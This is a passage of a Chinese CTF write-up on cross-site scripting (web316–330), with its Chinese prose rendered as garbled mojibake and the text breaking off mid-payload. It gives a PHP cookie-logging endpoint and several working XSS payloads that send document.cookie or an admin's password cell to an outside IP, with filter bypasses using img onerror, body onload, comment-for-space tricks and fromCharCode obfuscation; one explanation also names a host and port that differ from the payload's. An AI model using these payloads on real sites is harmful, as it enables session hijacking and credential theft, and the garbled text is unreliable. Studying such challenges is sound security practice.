title="Â≠òÂÇ®Âûã"></a>Â≠òÂÇ®Âûã</h5><p>ÊåÅ‰πÖÂûãË∑®Á´ôËÑöÊú¨ÔºàPersistent Cross-Site ScriptingÔºâ‰πüÁ≠âÂêå‰∫éÂ≠òÂÇ®ÂûãË∑®Á´ôËÑöÊú¨ÔºàStored Cross-Site ScriptingÔºâ„ÄÇ</p><p>Ê≠§Á±ª XSS ‰∏çÈúÄË¶ÅÁî®Êà∑ÂçïÂáªÁâπÂÆö URL Â∞±ËÉΩÊâßË°åË∑®Á´ôËÑöÊú¨ÔºåÊîªÂáªËÄÖ‰∫ãÂÖàÂ∞ÜÊÅ∂ÊÑè‰ª£Á†Å‰∏ä‰º†ÊàñÂÇ®Â≠òÂà∞ÊºèÊ¥ûÊúçÂä°Âô®‰∏≠ÔºåÂè™Ë¶ÅÂèóÂÆ≥ËÄÖÊµèËßàÂåÖÂê´Ê≠§ÊÅ∂ÊÑè‰ª£Á†ÅÁöÑÈ°µÈù¢Â∞±‰ºöÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å„ÄÇÊåÅ‰πÖÂûã XSS ‰∏ÄËà¨Âá∫Áé∞Âú®ÁΩëÁ´ôÁïôË®Ä„ÄÅËØÑËÆ∫„ÄÅÂçöÂÆ¢Êó•ÂøóÁ≠â‰∫§‰∫íÂ§ÑÔºåÊÅ∂ÊÑèËÑöÊú¨Â≠òÂÇ®Âà∞ÂÆ¢Êà∑Á´ØÊàñËÄÖÊúçÂä°Á´ØÁöÑÊï∞ÊçÆÂ∫ì‰∏≠„ÄÇ</p><h5 id="DOM-Âûã"><a href="#DOM-Âûã" class="headerlink" title="DOM Âûã"></a>DOM Âûã</h5><p>‰º†ÁªüÁöÑ XSS ÊºèÊ¥û‰∏ÄËà¨Âá∫Áé∞Âú®ÊúçÂä°Âô®Á´Ø‰ª£Á†Å‰∏≠ÔºåËÄå DOM-Based XSS ÊòØÂü∫‰∫é DOM ÊñáÊ°£ÂØπË±°Ê®°ÂûãÁöÑ‰∏ÄÁßçÊºèÊ¥ûÔºåÊâÄ‰ª•ÔºåÂèóÂÆ¢Êà∑Á´ØÊµèËßàÂô®ÁöÑËÑöÊú¨‰ª£Á†ÅÊâÄÂΩ±Âìç„ÄÇÂÆ¢Êà∑Á´Ø JavaScript ÂèØ‰ª•ËÆøÈóÆÊµèËßàÂô®ÁöÑ DOM ÊñáÊú¨ÂØπË±°Ê®°ÂûãÔºåÂõ†Ê≠§ËÉΩÂ§üÂÜ≥ÂÆöÁî®‰∫éÂä†ËΩΩÂΩìÂâçÈ°µÈù¢ÁöÑ URL„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂÆ¢Êà∑Á´ØÁöÑËÑöÊú¨Á®ãÂ∫èÂèØ‰ª•ÈÄöËøá DOM Âä®ÊÄÅÂú∞Ê£ÄÊü•Âíå‰øÆÊîπÈ°µÈù¢ÂÜÖÂÆπÔºåÂÆÉ‰∏ç‰æùËµñ‰∫éÊúçÂä°Âô®Á´ØÁöÑÊï∞ÊçÆÔºåËÄå‰ªéÂÆ¢Êà∑Á´ØËé∑Âæó DOM ‰∏≠ÁöÑÊï∞ÊçÆÔºàÂ¶Ç‰ªé URL ‰∏≠ÊèêÂèñÊï∞ÊçÆÔºâÂπ∂Âú®Êú¨Âú∞ÊâßË°å„ÄÇÂè¶‰∏ÄÊñπÈù¢ÔºåÊµèËßàÂô®Áî®Êà∑ÂèØ‰ª•ÊìçÁ∫µ DOM ‰∏≠ÁöÑ‰∏Ä‰∫õÂØπË±°Ôºå‰æãÂ¶Ç URL„ÄÅlocation Á≠â„ÄÇÁî®Êà∑Âú®ÂÆ¢Êà∑Á´ØËæìÂÖ•ÁöÑÊï∞ÊçÆÂ¶ÇÊûúÂåÖÂê´‰∫ÜÊÅ∂ÊÑè JavaScript ËÑöÊú¨ÔºåËÄåËøô‰∫õËÑöÊú¨Ê≤°ÊúâÁªèËøáÈÄÇÂΩìÁöÑËøáÊª§ÂíåÊ∂àÊØíÔºåÈÇ£‰πàÂ∫îÁî®Á®ãÂ∫èÂ∞±ÂèØËÉΩÂèóÂà∞Âü∫‰∫é DOM ÁöÑ XSS ÊîªÂáª„ÄÇ</p><p>Â∏∏ËßÅÁöÑÊ†áÁ≠æ</p><p>1.alert()</p><ul><li>alert(‚Äòxss‚Äô)</li><li>alert(‚Äúxss‚Äù)</li><li>alert(&#x2F;xss&#x2F;)</li><li>alert(document.cookie)</li></ul><p>2.confirm()</p><ul><li>confirm(‚Äòxss‚Äô)</li><li>confirm(‚Äúxss‚Äù)</li><li>confirm(&#x2F;xss&#x2F;)</li><li>confirm(document.cookie)</li></ul><p>3.prompt()</p><ul><li>prompt(‚Äòxss‚Äô)</li><li>prompt(‚Äúxss‚Äù)</li><li>prompt(&#x2F;xss&#x2F;)</li><li>prompt(document.coolkie)</li><li>(&#x2F;xss&#x2F;) ‰ª•‰∏ä‰∏âÁßçÊñπÊ≥ïÈÉΩÂèØ‰ª•ÂÆûÁé∞Ôºå‰ΩÜÊòØ‰ºöÂ§öÂá∫‰∏§‰∏™‚Äò&#x2F;‚Äô</li></ul><p>4.document.write()</p><ul><li>document.write(‚Äò</li></ul><h3 id="web316-333"><a href="#web316-333" class="headerlink" title="web316-333"></a>web316-333</h3><h4 id="web316-cookie-script"><a href="#web316-cookie-script" class="headerlink" title="web316(cookie script)"></a>web316(cookie script)</h4><p>ÂèØ‰ª•‰ΩøÁî®xssÂπ≥Âè∞Ôºå‰πüÂèØ‰ª•‰ΩøÁî®ÊúçÂä°Âô®Ëá™Â∑±Êê≠Âª∫</p><p>Âú®ÊúçÂä°Âô®‰∏äÈù¢Êîæ‰∏Ä‰∏™Êé•ÂèóCookieÁöÑÊñá‰ª∂„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>cookie.txtÈáåÈù¢Â∞±ÂèØ‰ª•ÁúãÂà∞flagÔºåÊàñËÄÖÊü•ÁúãÊó•Âøó</p><h4 id="web317-img"><a href="#web317-img" class="headerlink" title="web317(img)"></a>web317(img)</h4><p>ËøáÊª§‰∫Ü<code>script</code>ÂèØ‰ª•‰ΩøÁî®<code>img</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie <span class="token operator">></span></code></pre><h4 id="web318-body-iframe"><a href="#web318-body-iframe" class="headerlink" title="web318(body iframe)"></a>web318(body iframe)</h4><p>ËøáÊª§‰∫Ü<code>img</code>‰ΩøÁî®<code>body</code>ÊàñËÄÖ<code>iframe</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe ŒønlŒøad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><h4 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h4><p>Âêå318</p><h4 id="web320-326-Á©∫Ê†ºÁªïËøá-fromCharCode"><a href="#web320-326-Á©∫Ê†ºÁªïËøá-fromCharCode" class="headerlink" title="web320-326(Á©∫Ê†ºÁªïËøá  fromCharCode)"></a>web320-326(Á©∫Ê†ºÁªïËøá  fromCharCode)</h4><p>ËøáÊª§‰∫Ü<code>script</code>Ôºå<code>img</code>Ôºå<code>  </code>, <code>iframe</code>„ÄÇ</p><p>web322ËøáÊª§‰∫Üxss</p><p>Á©∫Ê†ºÂèØ‰ª•Áî®<code>%09</code>„ÄÅ<code>tab</code>„ÄÅ<code>/</code>„ÄÅ<code>/**/</code>„ÄÅ<code>%0a</code>‰ª£Êõø„ÄÇ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token comment">/**/</span>ŒønlŒøad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><p>Êâ©Â±ï‰∏Ä‰∏ãpayloadÔºö</p><p>String.fromCharCode()ÂáΩÊï∞ÔºöasciiÁ†ÅËΩ¨Â≠óÁ¨¶</p><p>ÂèÇËÄÉÔºö<a href="https://www.runoob.com/jsref/jsref-fromcharcode.html">https://www.runoob.com/jsref/jsref-fromcharcode.html</a></p><p>String.fromCharCode(111,110,108,111,97,100); ÊéßÂà∂Âè∞ËøêË°åÁªìÊûúÂ¶Ç‰∏ãÔºö</p><p><img src="web%E5%85%A5%E9%97%A8-xss%5Cweb320.png" loading="lazy"></p><p>Áî®ÂÆÉÊàëÂèØ‰ª•ÊûÑÈÄ†‰∏Ä‰∏™payloadÔºö</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>ŒønlŒøad<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>String2ascii.py</p><pre class="language-python" data-language="python"><code class="language-python">input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"ËØ∑ËæìÂÖ•Â≠óÁ¨¶‰∏≤: "</span><span class="token punctuation">)</span>  <span class="token comment"># Ëé∑ÂèñÁî®Êà∑ËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤</span>ascii_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># ÈÅçÂéÜÂ≠óÁ¨¶‰∏≤ÔºåÂ∞ÜÊØè‰∏™Â≠óÁ¨¶ËΩ¨Êç¢‰∏∫ASCIIÁ†ÅÔºåÂπ∂Ê∑ªÂä†Âà∞ÂàóË°®‰∏≠</span><span class="token keyword">for</span> char <span class="token keyword">in</span> input_str<span class="token punctuation">:</span>    ascii_code <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>  <span class="token comment"># ‰ΩøÁî®ord()ÂáΩÊï∞Ëé∑ÂèñÂ≠óÁ¨¶ÁöÑASCIIÁ†Å</span>    ascii_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ascii_code<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Â∞ÜASCIIÁ†ÅËΩ¨Êç¢‰∏∫Â≠óÁ¨¶‰∏≤Âπ∂Ê∑ªÂä†Âà∞ÂàóË°®</span><span class="token comment"># Â∞ÜÂàóË°®‰∏≠ÁöÑASCIIÁ†ÅÁî®ÈÄóÂè∑ÈöîÂºÄÔºåÂπ∂ÊâìÂç∞ÁªìÊûú</span>result <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ascii_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ËΩ¨Êç¢ÂêéÁöÑASCIIÁ†Å:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span></code></pre><p>Ascii2string.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ascii_to_string</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Â∞Ü‰ª•ÈÄóÂè∑ÂàÜÈöîÁöÑASCIIÁ†ÅÂ≠óÁ¨¶‰∏≤ÂàÜÂâ≤Êàê‰∏Ä‰∏™ÂàóË°®</span>    ascii_list <span class="token operator">=</span> ascii_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment"># ‰ΩøÁî®ÂàóË°®Êé®ÂØºÂºèÂ∞ÜASCIIÁ†ÅËΩ¨Êç¢‰∏∫Â≠óÁ¨¶ÔºåÂπ∂ËøûÊé•Êàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> code <span class="token keyword">in</span> ascii_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># ËæìÂÖ•‰ª•ÈÄóÂè∑ÂàÜÈöîÁöÑASCIIÁ†ÅÂ≠óÁ¨¶‰∏≤</span>ascii_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"ËØ∑ËæìÂÖ•‰ª•ÈÄóÂè∑ÂàÜÈöîÁöÑASCIIÁ†ÅÂ≠óÁ¨¶‰∏≤: "</span><span class="token punctuation">)</span><span class="token comment"># Ë∞ÉÁî®ÂáΩÊï∞ËøõË°åËΩ¨Êç¢Âπ∂ÊâìÂç∞ÁªìÊûú</span>string_result <span class="token operator">=</span> ascii_to_string<span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ËΩ¨Êç¢ÂêéÁöÑÂ≠óÁ¨¶‰∏≤:"</span><span class="token punctuation">,</span> string_result<span class="token punctuation">)</span></code></pre><h4 id="web327-Â≠òÂÇ®Âûãxss"><a href="#web327-Â≠òÂÇ®Âûãxss" class="headerlink" title="web327(Â≠òÂÇ®Âûãxss)"></a>web327(Â≠òÂÇ®Âûãxss)</h4><p>ËôΩÁÑ∂‰ΩÜÊòØÔºåËøòÊòØ‰πãÂâçÁöÑpayloadÔºåÊî∂‰ª∂‰∫∫ÂøÖÈ°ªÊòØadmin</p><h4 id="web328-‰º™ÈÄ†Cookie"><a href="#web328-‰º™ÈÄ†Cookie" class="headerlink" title="web328(‰º™ÈÄ†Cookie)"></a>web328(‰º™ÈÄ†Cookie)</h4><p>ÂÖàÊèêÂâçÁõëÂê¨5010Á´ØÂè£ÔºåÁÑ∂ÂêéÂú®Ê≥®ÂÜåÁî®Êà∑ÁöÑÊó∂ÂÄôÊ≥®ÂÖ•payloadÔºåÂèçÂºπÁÆ°ÁêÜÂëòÁöÑcookie</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>ËøôÊ†∑ÂæóÂà∞adminÁöÑcookieËøõË°å‰º™ÈÄ†Êü•ÁúãÁî®Êà∑Âç≥ÂèØÂæóÂà∞flag</p><h4 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h4><p>Âíå‰∏äÈ¢ò‰∏çÂêåÁöÑÊòØÔºåCookie‰ºöÁ´ãÂàªÂ§±Êïà„ÄÇ‰∏çËÉΩÈÄöËøáÁ™ÉÂèñCookieÁöÑÂΩ¢ÂºèÂæóÂà∞flag‰∫Ü„ÄÇ</p><p>Êàë‰ª¨ÂàÜÊûê‰∏Ä‰∏ãÂéüÁêÜÔºåÊàë‰ª¨ÁöÑpayload‰Ωú‰∏∫ÂÇ®Â≠òÂûãXSSÔºåÁÆ°ÁêÜÂëòËÆøÈóÆÊó∂ÂÄôËÉΩË¢´Êàë‰ª¨Á™ÉÂèñCookieÔºåÈÇ£ÊòØ‰∏çÊòØËøòËÉΩÁ™ÉÂèñÁÇπÂà´ÁöÑ‰∏úË•øÂë¢ÔºåÊØîÂ¶ÇËØ¥ÁÆ°ÁêÜÂëòÁúãÂà∞ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å„ÄÇÁêÜËÆ∫‰∏äÊù•ËØ¥ÊòØÂèØ‰ª•ÁöÑÔºåÊâÄ‰ª•Â∞±Áõ¥Êé•Ëé∑ÂèñÁÆ°ÁêÜÂëòÁöÑÈ°µÈù¢‰ø°ÊÅØ„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÁ±ªÂêçÊü•ÊâæÂÖÉÁ¥†ÔºåÈÄöËøádocumentÊù•Ëé∑Âèñ„ÄÇ</p><p>Áé∞Âú®ÊúçÂä°Âô®‰∏äÈù¢ÁõëÂê¨Á´ØÂè£5010„ÄÇ</p><p>innerHTMLÂíåouterHTMLÁöÑÂå∫Âà´</p><blockquote><p>1„ÄÅinnerHTML:<br>„ÄÄ„ÄÄ‰ªéÂØπË±°ÁöÑËµ∑Âßã‰ΩçÁΩÆÂà∞ÁªàÊ≠¢‰ΩçÁΩÆÁöÑÂÖ®ÈÉ®ÂÜÖÂÆπ,‰∏çÂåÖÊã¨HtmlÊ†áÁ≠æ„ÄÇ<br>innerTextÂèØÊõø‰ª£innerHTML</p><p>2„ÄÅouterHTML:<br>„ÄÄ„ÄÄÈô§‰∫ÜÂåÖÂê´innerHTMLÁöÑÂÖ®ÈÉ®ÂÜÖÂÆπÂ§ñ, ËøòÂåÖÂê´ÂØπË±°Ê†áÁ≠æÊú¨Ë∫´„ÄÇ</p></blockquote><p><img src="web329.png" alt="img" loading="lazy"></p><p>ÂèØ‰ª•ÁúãÂà∞ÂâçÁ´Ø‰ª£Á†Å‰∏≠Â∞ÜË¶ÅÊòæÁ§∫adminÂØÜÁ†ÅÁöÑÂú∞ÊñπÁ±ª‰∏∫<code>layui-table-cell laytable-cell-1-0-1</code></p><p>payloadÔºö </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'layui-table-cell laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>Ëß£Èáä‰∏Ä‰∏ãÂÆÉÁöÑÊØè‰∏ÄÈÉ®ÂàÜÔºö</p><blockquote><p><code>window.open(&#39;http://117.72.70.186:5010/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)</code>ËøôÊòØ‰∏Ä‰∏™Ë∞ÉÁî® window.open() ÂáΩÊï∞ÁöÑËØ≠Âè•ÔºåÁî®‰∫éÊâìÂºÄÊñ∞ÁöÑÊµèËßàÂô®Á™óÂè£„ÄÇ<br><code>&#39;http://117.72.70.186:5010/&#39;</code> ËøôÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåË°®Á§∫Ë¶ÅÊâìÂºÄÁöÑÁΩëÈ°µÁöÑ URL„ÄÇÂÆÉÂåÖÊã¨‰∫ÜÂçèËÆÆÔºàhttp:&#x2F;&#x2F;Ôºâ„ÄÅ‰∏ªÊú∫ÂêçÔºà120.46.41.173ÔºâÂíåÁ´ØÂè£Âè∑Ôºà9023ÔºâÔºå‰ª•ÂèäË∑ØÂæÑÔºàÂêéÈù¢ÁöÑÊñúÊù† &#x2F;Ôºâ„ÄÇ<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML</code> ËøôÊòØ‰∏ÄÁ≥ªÂàó DOM Êìç‰ΩúÔºåÁî®‰∫éËé∑ÂèñÁΩëÈ°µ‰∏≠ÁâπÂÆöÂÖÉÁ¥†ÁöÑÂÜÖÂÆπ„ÄÇ<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)</code> ÊòØ‰∏Ä‰∏™ÈÄöËøáÁ±ªÂêçÊü•ÊâæÂÖÉÁ¥†ÁöÑÊñπÊ≥ï„ÄÇÂÆÉÊü•ÊâæÂÖ∑ÊúâÁ±ªÂêç <code>&#39;layui-table-cell&#39;</code> Âíå <code>&#39;laytable-cell-1-0-1&#39;</code> ÁöÑÂÖÉÁ¥†ÔºåÈÄöÂ∏∏ËøôÊòØ‰∏ÄÁßçÈíàÂØπË°®Ê†ºÂçïÂÖÉÊ†ºÁöÑÈÄâÊã©„ÄÇ<br><code>[1]</code> Ë°®Á§∫‰ªéÂåπÈÖçÁöÑÂÖÉÁ¥†ÂàóË°®‰∏≠ÈÄâÊã©Á¨¨‰∫å‰∏™ÂÖÉÁ¥†ÔºàJavaScript ‰∏≠ÁöÑÊï∞ÁªÑÁ¥¢Âºï‰ªé 0 ÂºÄÂßãÔºâ„ÄÇ<br><code>.innerHTML</code> Áî®‰∫éËé∑ÂèñÈÄâÂÆöÂÖÉÁ¥†ÁöÑ HTML ÂÜÖÂÆπÔºå‰πüÂ∞±ÊòØÂú®Ëøô‰∏™Ë°®Ê†ºÂçïÂÖÉÊ†º‰∏≠ÊòæÁ§∫ÁöÑÊñáÊú¨Êàñ HTML„ÄÇ</p></blockquote><p><img src="web329_2.png" loading="lazy"></p><h4 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h4><p>Â§ö‰∫Ü‰∏Ä‰∏™‰øÆÊîπÂØÜÁ†ÅÔºåÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫Ü<code>api/change.php</code>ÂèÇÊï∞pÂàôÊòØÊàë‰ª¨‰øÆÊîπÁöÑÂØÜÁ†Å</p><p><img src="web330.png" loading="lazy"></p><p>Êàë‰ª¨ÂèØ‰ª•‰º™ÈÄ†adminÁöÑcookieÊù•Âéª‰øÆÊîπÂØÜÁ†ÅÔºå‰ΩÜcookieÊòØÊöÇÊó∂ÁöÑÔºåÊâÄ‰ª•Âà©Áî®xss‰∏ªÂä®ÂéªÊîπ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token 